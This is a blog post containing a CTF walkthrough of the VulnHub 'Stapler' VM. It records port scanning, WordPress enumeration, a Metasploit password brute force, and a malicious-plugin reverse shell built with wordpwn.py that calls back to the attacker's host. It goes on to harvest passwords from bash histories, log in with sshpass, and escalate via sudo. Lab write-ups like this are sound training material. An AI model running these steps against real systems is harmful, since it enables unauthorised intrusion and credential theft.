+        <a  class="All OS "
+           href="/post/How%20do%20I%20setup%20nitrogen%20&%20pywal.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="How do I setup nitrogen &amp; pywal">How do I setup nitrogen &amp; pywal</span>
+            <span class="post-date" title="2021-12-25 10:15:00">2021/12/25</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Setup_Xfce_with_i3.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Setup Xfce with i3">Setup Xfce with i3</span>
+            <span class="post-date" title="2021-12-24 12:17:00">2021/12/24</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Set%20up%20port%20knocking%20server%20to%20hide%20an%20open%20port.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Set up port knocking server to hide an open port">Set up port knocking server to hide an open port</span>
+            <span class="post-date" title="2021-10-31 08:15:00">2021/10/31</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Ambassador.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Ambassador">CTF Ambassador</span>
+            <span class="post-date" title="2021-10-10 11:09:00">2021/10/10</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20M0rsarchive.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF M0rsarchive">CTF M0rsarchive</span>
+            <span class="post-date" title="2021-10-10 11:09:00">2021/10/10</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Photobomb.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Photobomb">CTF Photobomb</span>
+            <span class="post-date" title="2021-10-10 02:09:00">2021/10/10</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Trick.html"
+           data-tag="sqlmap"
+           data-author="" >
+            <span class="post-title" title="CTF Trick">CTF Trick</span>
+            <span class="post-date" title="2021-10-06 09:40:00">2021/10/06</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20Choppy.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Choppy">CTF Choppy</span>
+            <span class="post-date" title="2021-10-02 09:15:00">2021/10/02</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Run%20non%20steam%20game%20with%20proton%20on%20lutris.html"
+           data-tag="Linux, Gaming"
+           data-author="" >
+            <span class="post-title" title="Setup Xfce with i3">Setup Xfce with i3</span>
+            <span class="post-date" title="2021-09-15 12:40:00">2021/09/15</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Add%20windows%20to%20grub.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Add windows to grub">Add windows to grub</span>
+            <span class="post-date" title="2021-08-28 15:54:00">2021/08/28</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Set%20Polybar%20on%202%20screens.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Set Polybar on 2 screens">Set Polybar on 2 screens</span>
+            <span class="post-date" title="2021-08-08 12:15:00">2021/08/08</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Fix%20the%20blur%20with%20picom.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Fix the blur with picom">Fix the blur with picom</span>
+            <span class="post-date" title="2021-07-19 06:40:00">2021/07/19</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Configure_touchpad_on_i3.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Configure the touchpad [I3]">Configure the touchpad [I3]</span>
+            <span class="post-date" title="2021-07-16 10:16:00">2021/07/16</span>
+        </a>
+        
+        <a  class="All "
+           href="/post/Send%20a%20file%20via%20ssh.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Send a file via ssh">Send a file via ssh</span>
+            <span class="post-date" title="2021-07-14 12:15:00">2021/07/14</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Install%20nvidia%20driver%20on%20Arch%20Linux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Install nvidia driver on Arch Linux">Install nvidia driver on Arch Linux</span>
+            <span class="post-date" title="2021-07-14 01:48:00">2021/07/14</span>
+        </a>
+        
+        <a  class="All "
+           href="/post/Restore%20a%20backup%20with%20timeshift.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Restore a backup with timeshift">Restore a backup with timeshift</span>
+            <span class="post-date" title="2021-07-12 09:59:00">2021/07/12</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Add%20a%20partition%20in%20linux.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Add a partition in linux">Add a partition in linux</span>
+            <span class="post-date" title="2021-07-11 11:06:00">2021/07/11</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Get%20a%20shell%20when%20Arch%20Linux%20is%20broken.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Get a shell when Arch Linux is broken">Get a shell when Arch Linux is broken</span>
+            <span class="post-date" title="2021-07-07 14:55:00">2021/07/07</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Installing%20AUR%20packages.html"
+           data-tag="arch"
+           data-author="" >
+            <span class="post-title" title="Installing AUR packages">Installing AUR packages</span>
+            <span class="post-date" title="2021-07-04 21:45:00">2021/07/04</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/Arch%20Linux%20installation%20guide.html"
+           data-tag="Arch"
+           data-author="" >
+            <span class="post-title" title="Arch Linux installation guide">Arch Linux installation guide</span>
+            <span class="post-date" title="2021-07-01 12:15:00">2021/07/01</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF-gigachad.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTF-gigachad">CTF-gigachad</span>
+            <span class="post-date" title="2021-07-01 12:15:00">2021/07/01</span>
+        </a>
+        
+        <a  class="All dev "
+           href="/post/Create%20an%20IRC%20bot%20with%20python.html"
+           data-tag="IRC"
+           data-author="" >
+            <span class="post-title" title="Create an IRC bot with python">Create an IRC bot with python</span>
+            <span class="post-date" title="2021-06-22 05:25:00">2021/06/22</span>
+        </a>
+        
+        <a  class="All OS "
+           href="/post/OpenVPN.html"
+           data-tag="VPN"
+           data-author="" >
+            <span class="post-title" title="OpenVPN">OpenVPN</span>
+            <span class="post-date" title="2021-06-21 01:53:00">2021/06/21</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF%20agile.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="agile">agile</span>
+            <span class="post-date" title="2021-04-13 03:15:00">2021/04/13</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/Cr%C3%A9ation%20d'un%20relais%20tor%20avec%20debian%2010.html"
+           data-tag="tor"
+           data-author="" >
+            <span class="post-title" title="Création d&#39;un relais tor avec debian 10">Création d&#39;un relais tor avec debian 10</span>
+            <span class="post-date" title="2021-04-09 21:45:00">2021/04/09</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/Securing%20an%20apache%20server.html"
+           data-tag="webserver"
+           data-author="" >
+            <span class="post-title" title="Securing an apache server">Securing an apache server</span>
+            <span class="post-date" title="2021-03-09 19:45:00">2021/03/09</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-CTF Stapler" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">CTF Stapler</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="CTF">CTF</a>
+            
+        </span>
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-04-12 16:58:06'>2022-01-15 08:07</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:1.5k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Discovery"><span class="toc-text">Discovery</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Scanning"><span class="toc-text">Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#netdiscover"><span class="toc-text">netdiscover</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ftp"><span class="toc-text">ftp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http"><span class="toc-text">http</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dirb"><span class="toc-text">dirb</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Browsing"><span class="toc-text">Browsing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nikto-on-12380"><span class="toc-text">Nikto on 12380</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wpscan"><span class="toc-text">wpscan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-666"><span class="toc-text">Port 666</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-139"><span class="toc-text">Port 139</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-force-metasploit"><span class="toc-text">Brute force metasploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload-a-revers-shell"><span class="toc-text">upload a revers shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linenum-sh"><span class="toc-text">linenum.sh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-peter"><span class="toc-text">SSH peter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enum-sudo"><span class="toc-text">Enum sudo</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Discovery"><a href="#Discovery" class="headerlink" title="Discovery"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#Discovery" title="Discovery"></a>Discovery</h1><p><a href="https://www.vulnhub.com/entry/stapler-1,150/">https://www.vulnhub.com/entry/stapler-1,150/</a></p>
+<h1 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#Scanning" title="Scanning"></a>Scanning</h1><h2 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#netdiscover" title="netdiscover"></a>netdiscover</h2><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">sudo netdiscover<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://i.imgur.com/pPEuIvU.png"></p>
+<p>192.168.0.34</p>
+<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#nmap" title="nmap"></a>nmap</h2><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">sudo nmap 192.168.0.34 -sV -p-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://i.imgur.com/AoMoifv.jpg"></p>
+<p>12 open ports:</p>
+<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#ftp" title="ftp"></a>ftp</h2><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">ftp
+connect 192.168.0.34<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>Connected to <a href="mailto:ftp@192.168.0.34">ftp@192.168.0.34</a>.<br>220-<br>220-|—————————————————————————————–|<br>220-| Harry, make sure to update the banner when you get a chance to show who has access here |<br>220-|—————————————————————————————–|<br>220-</p>
+<p>We have a username: <code>harry</code></p>
+<pre class="line-numbers language-none"><code class="language-none">ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             107 Jun 03  2016 note
+226 Directory send OK.
+ftp&gt; get note
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note (107 bytes).
+226 Transfer complete.
+107 bytes received in 0,000452 seconds (231 kbytes&#x2F;s)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Let’s what is in the note.</p>
+<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">cat ~&#x2F;note
+
+&#96;Elly&#96;, make sure you update the payload information. Leave it in your FTP account once your are done, &#96;John&#96;.
+Now we have 3 usersneme: harry, Elly and John
+We have to connect with Elly to find the &#96;payload information&#96;.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="http"><a href="#http" class="headerlink" title="http"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#http" title="http"></a>http</h2><h3 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#dirb" title="dirb"></a>dirb</h3><p>After a scan on the port 80 we have this:</p>
+<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">---- Scanning URL: http:&#x2F;&#x2F;192.168.1.27:80&#x2F; ----
++ http:&#x2F;&#x2F;192.168.1.27:80&#x2F;.bashrc (CODE:200|SIZE:3771)
++ http:&#x2F;&#x2F;192.168.1.27:80&#x2F;.profile (CODE:200|SIZE:675)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><code>.bashrc</code></p>
+<pre class="line-numbers language-none"><code class="language-none"># If not running interactively, don&#39;t do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+# don&#39;t put duplicate lines or lines starting with space in the history.
+# See bash(1) for more options
+HISTCONTROL&#x3D;ignoreboth
+
+# append to the history file, don&#39;t overwrite it
+shopt -s histappend
+
+# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
+HISTSIZE&#x3D;1000
+HISTFILESIZE&#x3D;2000
+
+# check the window size after each command and, if necessary,
+# update the values of LINES and COLUMNS.
+shopt -s checkwinsize
+
+# If set, the pattern &quot;**&quot; used in a pathname expansion context will
+# match all files and zero or more directories and subdirectories.
+#shopt -s globstar
+
+# make less more friendly for non-text input files, see lesspipe(1)
+[ -x &#x2F;usr&#x2F;bin&#x2F;lesspipe ] &amp;&amp; eval &quot;$(SHELL&#x3D;&#x2F;bin&#x2F;sh lesspipe)&quot;
+
+# set variable identifying the chroot you work in (used in the prompt below)
+if [ -z &quot;$&#123;debian_chroot:-&#125;&quot; ] &amp;&amp; [ -r &#x2F;etc&#x2F;debian_chroot ]; then
+    debian_chroot&#x3D;$(cat &#x2F;etc&#x2F;debian_chroot)
+fi
+
+# set a fancy prompt (non-color, unless we know we &quot;want&quot; color)
+case &quot;$TERM&quot; in
+    xterm-color|*-256color) color_prompt&#x3D;yes;;
+esac
+
+# uncomment for a colored prompt, if the terminal has the capability; turned
+# off by default to not distract the user: the focus in a terminal window
+# should be on the output of commands, not on the prompt
+#force_color_prompt&#x3D;yes
+
+if [ -n &quot;$force_color_prompt&quot; ]; then
+    if [ -x &#x2F;usr&#x2F;bin&#x2F;tput ] &amp;&amp; tput setaf 1 &gt;&amp;&#x2F;dev&#x2F;null; then
+	# We have color support; assume it&#39;s compliant with Ecma-48
+	# (ISO&#x2F;IEC-6429). (Lack of such support is extremely rare, and such
+	# a case would tend to support setf rather than setaf.)
+	color_prompt&#x3D;yes
+    else
+	color_prompt&#x3D;
+    fi
+fi
+
+if [ &quot;$color_prompt&quot; &#x3D; yes ]; then
+    PS1&#x3D;&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;
+else
+    PS1&#x3D;&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>.profil</code></p>
+<pre class="line-numbers language-none"><code class="language-none">if [ -n &quot;$BASH_VERSION&quot; ]; then
+    # include .bashrc if it exists
+    if [ -f &quot;$HOME&#x2F;.bashrc&quot; ]; then
+	. &quot;$HOME&#x2F;.bashrc&quot;
+    fi
+fi
+
+# set PATH so it includes user&#39;s private bin if it exists
+if [ -d &quot;$HOME&#x2F;bin&quot; ] ; then
+    PATH&#x3D;&quot;$HOME&#x2F;bin:$PATH&quot;
+fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Browsing"><a href="#Browsing" class="headerlink" title="Browsing"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#Browsing" title="Browsing"></a>Browsing</h2><p>On the port 12380 we have this.  </p>
+<p><img src="https://i.imgur.com/6XecLET.png"></p>
+<p>We have this comment:<br><code>A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you!</code>  </p>
+<p><img src="https://i.imgur.com/WpwMRvM.png"></p>
+<p>Now we have 5 usernames:<br>harry, Elly, Tim, John and Zoe</p>
+<h2 id="Nikto-on-12380"><a href="#Nikto-on-12380" class="headerlink" title="Nikto on 12380"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#Nikto-on-12380" title="Nikto on 12380"></a>Nikto on 12380</h2><pre class="line-numbers language-none"><code class="language-none">+ Entry &#39;&#x2F;admin112233&#x2F;&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry &#39;&#x2F;blogblog&#x2F;&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ &#x2F;phpmyadmin&#x2F;: phpMyAdmin directory found
++ &quot;robots.txt&quot; contains 2 entries which should be manually viewed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>You have to entry with https, or it will fail.<br>In the robots.txt we have <code>/admin112233/</code> and <code>/blogblog/</code><br><a href="https://192.168.0.34:12380/admin112233/">https://192.168.0.34:12380/admin112233/</a>:  </p>
+<p><img src="https://i.imgur.com/K08Mju6.png"></p>
+<p><a href="https://192.168.0.34:12380/blogblog/">https://192.168.0.34:12380/blogblog/</a>:  </p>
+<p><img src="https://i.imgur.com/A7JFwQp.png"></p>
+<p>It’s using wordpress, here is the login page:<br><a href="https://192.168.0.34:12380/blogblog/wp-login.php">https://192.168.0.34:12380/blogblog/wp-login.php</a></p>
+<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#wpscan" title="wpscan"></a>wpscan</h2><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">wpscan --disable-tls-checks --url https:&#x2F;&#x2F;192.168.0.34:12380&#x2F;blogblog&#x2F; --enumerate ap --enumerate at --enumerate u --enumerate vp --enumerate cb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Upload directory has listing enabled: <a href="https://192.168.0.34:12380/blogblog/wp-content/uploads/">https://192.168.0.34:12380/blogblog/wp-content/uploads/</a><br>WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).</p>
+<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">wpscan --disable-tls-checks --url https:&#x2F;&#x2F;192.168.0.34:12380&#x2F;blogblog&#x2F; --enumerate u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>We have some users.<br>tim, kathy, scott, heather, peter, elly, barry, harry, John Smith, john, garry<br>The main user is john:  </p>
+<p><img src="https://i.imgur.com/grHvJdS.png"></p>
+<p>wpscan –url <a href="https://192.168.0.34:12380/blogblog/">https://192.168.0.34:12380/blogblog/</a> –wordlist ~/Documents/wordlist/rockyou.txt –username John –threads 100<br>It’s not working</p>
+<h2 id="Port-666"><a href="#Port-666" class="headerlink" title="Port 666"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#Port-666" title="Port 666"></a>Port 666</h2><p>On the port 666 we have this.</p>
+<p><img src="https://i.imgur.com/zV3MsmS.png"></p>
+<h2 id="Port-139"><a href="#Port-139" class="headerlink" title="Port 139"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#Port-139" title="Port 139"></a>Port 139</h2><p>139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</p>
+<p>It’s a samba server.  </p>
+<p><img src="https://i.imgur.com/2WLCCjG.png"></p>
+<p>I found nothing interesting in the backups.<br>You can also use nautilus to download and browse in the smb server.</p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#Exploit" title="Exploit"></a>Exploit</h1><h2 id="Brute-force-metasploit"><a href="#Brute-force-metasploit" class="headerlink" title="Brute force metasploit"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#Brute-force-metasploit" title="Brute force metasploit"></a>Brute force metasploit</h2><p>I’ve done a bruteforce with metasploit with the wordlist rockyou and the user john, because he is the one who manage the website.<br>The password is <code>incorrect</code>.</p>
+<h2 id="upload-a-revers-shell"><a href="#upload-a-revers-shell" class="headerlink" title="upload a revers shell"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#upload-a-revers-shell" title="upload a revers shell"></a>upload a revers shell</h2><p>You can upload files in wordpress.<br><a href="https://192.168.0.34:12380/blogblog/wp-admin/plugin-install.php?tab=upload">https://192.168.0.34:12380/blogblog/wp-admin/plugin-install.php?tab=upload</a></p>
+<p>I’v tried with this one:<br><a href="https://docs.j7k6.org/wordpress-malicious-plugin-reverse-shell-metasploit/">https://docs.j7k6.org/wordpress-malicious-plugin-reverse-shell-metasploit/</a></p>
+<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;wetw0rk&#x2F;malicious-wordpress-plugin&#x2F;master&#x2F;wordpwn.py
+python wordpwn.py 192.168.0.21 4444 Y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>Then, unzip the file and upload <code>wetw0rk_maybe.php</code><br>Open it via this link:<br><a href="https://192.168.0.34:12380/blogblog/wp-content/uploads/">https://192.168.0.34:12380/blogblog/wp-content/uploads/</a></p>
+<p>Now you should have a meterpreter.  </p>
+<p><img src="https://i.imgur.com/PVopOep.png"></p>
+<h2 id="linenum-sh"><a href="#linenum-sh" class="headerlink" title="linenum.sh"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#linenum-sh" title="linenum.sh"></a>linenum.sh</h2><pre class="line-numbers language-none"><code class="language-none">    Hostname: red.initech
+       Linux: 4.4.0-21-generic
+Distribution: Ubuntu 16.04 LTS
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( users )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+[*] usr020 Are there other users in administrative groups?................. yes!
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( file system )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+[*] fst000 Writable files outside user&#39;s home.............................. yes!
+[*] fst010 Binaries with setuid bit........................................ yes!
+[*] fst080 Can we read subdirectories under &#x2F;home?......................... yes!
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( network )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+[*] net000 Services listening only on localhost............................ yes!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>I think the kernel can be exploited but I have to finish the reco first.</p>
+<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">find &#x2F;home<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>peter is diferent, I think he can use sudo.<br>/home/peter/.sudo_as_admin_successful</p>
+<p>Let’s see deeper.</p>
+<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">cat &#x2F;home&#x2F;*&#x2F;.bash_hi*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://i.imgur.com/tKGXB5R.png"></p>
+<p>We have JKanode and peter, peter can use sudo so let’s go for peter.</p>
+<pre class="line-numbers language-none"><code class="language-none">sshpass -p thisimypassword ssh JKanode@localhost
+apt-get install sshpass
+sshpass -p JZQuyIN5 peter@localhost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="SSH-peter"><a href="#SSH-peter" class="headerlink" title="SSH peter"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#SSH-peter" title="SSH peter"></a>SSH peter</h2><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">ssh peter@192.168.0.34
+JZQuyIN5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="Enum-sudo"><a href="#Enum-sudo" class="headerlink" title="Enum sudo"></a><a href="https://peanutstick.github.io/post/CTF_Stapler.html#Enum-sudo" title="Enum sudo"></a>Enum sudo</h2><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">User peter may run the following commands on red:
+    (ALL : ALL) ALL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">sudo su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>We are root.  </p>
+<p><img src="https://i.imgur.com/RHYUmp7.png"></p>
+<p>Let’s get this flag.  </p>
+<p><img src="https://i.imgur.com/2ggYBPH.png"></p>
+
+      
+       
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2021 Peanutstick&#39;s Blog
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
